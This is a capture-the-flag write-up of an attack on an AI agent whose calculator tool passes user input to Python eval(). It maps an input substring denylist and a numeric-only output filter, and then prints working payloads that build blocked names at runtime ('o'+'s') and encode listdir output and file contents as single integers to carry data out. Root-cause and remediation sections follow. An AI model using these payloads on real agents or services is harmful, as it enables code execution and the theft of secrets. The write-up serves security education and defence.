# Advanced 5, Bad Robot: a calculator that runs `eval()`

![Attack chain: a math calculator tool backed by Python eval, two denylist controls mapped one probe at a time, the input substring filter beaten with runtime string construction and the numeric output filter beaten by encoding the file contents as one integer; the right panel shows the two controls and why each fails, ending in remote code execution in the tool runtime](diagram.png)

> ARKX Mothership, Advanced track, level 5. Public CTF by CyberArk Labs, played as a participant.
> The flag is a CTF value. No third-party data appears here.

---

## Context

The level presents a "Math Calculation Service", described as a compute node that evaluates complex mathematical expressions. The agent exposes one tool, `calculate`, described as a powerful calculator for complex expressions. A calculator that accepts arbitrary expressions is the first thing to test, because the usual way to build one quickly is the language's own evaluator.

## Recon

Asked the agent for its tools, names and parameters. It reported one tool, `calculate`, taking an expression string. The agent forwards the expression to the tool and returns the result with no commentary of its own.

## Fingerprint the backend

A math service should reject anything that is not arithmetic. A single probe settles whether the backend is a real parser or a language evaluator:

```python
len(str(2**100))
```

This returned `31`. `len` and `str` are Python builtins, not arithmetic, so the backend is Python `eval()` and the agent forwards the expression verbatim with no filtering of its own.

## Map the defenses

A direct payload drew the first control:

```python
__import__('os').listdir('.')
```

Response: `Expression contains prohibited values`. That is an input denylist on raw substrings.

One probe per candidate, batched in a single turn, separated the two controls:

| Probe | Result | Meaning |
|---|---|---|
| `'os'` | prohibited values | substring on the input denylist |
| `eval('1+1')` | `2` | passes input, numeric result allowed |
| `getattr(1,'real')` | `1` | passes input, numeric result allowed |
| `(1).__class__` | output format not supported | passes input, non-numeric result blocked |
| `'imp'+'ort'` | output format not supported | passes input, non-numeric result blocked |
| `open` | output format not supported | passes input, non-numeric result blocked |

Two independent controls stand between the attacker and the data. A substring denylist on the input, and a numeric-only filter on the output. Each is a separate problem.

## Bypass both

The input denylist matches literal substrings, so building the blocked token at runtime defeats it. `os` becomes `'o'+'s'`. The output filter checks the type of the result, not its information content, so any data leaves the sandbox once it is expressed as a single integer.

Locate the files, encoded as one integer:

```python
int.from_bytes(str(__import__('o'+'s').listdir('.')).encode(), 'big')
```

Returned `28210767681355614078264158045`, which decodes locally to `['flag.txt']`.

Read the flag the same way:

```python
int.from_bytes(open('flag.txt').read().encode(), 'big')
```

Returned `123822245949675422196577841`, which decodes to the flag.

Local decode:

```bash
python3 -c "n=<integer>; print(n.to_bytes((n.bit_length()+7)//8,'big').decode())"
```

## Root cause

The tool evaluates attacker-controlled text with Python `eval()`. A calculator that evaluates arbitrary expressions is a full interpreter, so arbitrary code runs in the tool process with its file-system access (CWE-95).

The agent is a pass-through. It forwards whatever the user calls an "expression" and classifies no intent, so the only defenses are the two filters inside the tool.

Both controls are denylist-style. The input filter matches raw substrings, which runtime string construction defeats (CWE-184). The output filter checks the type of the result, not its information content, so data of any size leaves as an integer.

## Impact

Critical. Remote code execution in the tool runtime, reached through a chat interface with no authentication beyond chat access. In a real deployment an attacker reads secrets such as environment variables, API keys and credential files, pivots from the host into the internal network, and tampers with data. The output filter slows exfiltration and does not prevent it.

## Remediation

- Parse expressions with a real math grammar: an AST allowlist of numeric nodes and operators, or a math library. Never `eval` user input.
- Run the tool in a sandbox with no file-system access and no secrets, under least privilege.
- Do not treat an output type check as a containment boundary. It shapes exfiltration without stopping it.

---

*ATLAS: T0050 Command and Scripting Interpreter, T0053 AI Agent Tool Invocation. OWASP LLM 2025: LLM05 Improper Output Handling, LLM06 Excessive Agency, LLM02 Sensitive Information Disclosure. CWE-95, CWE-184.*
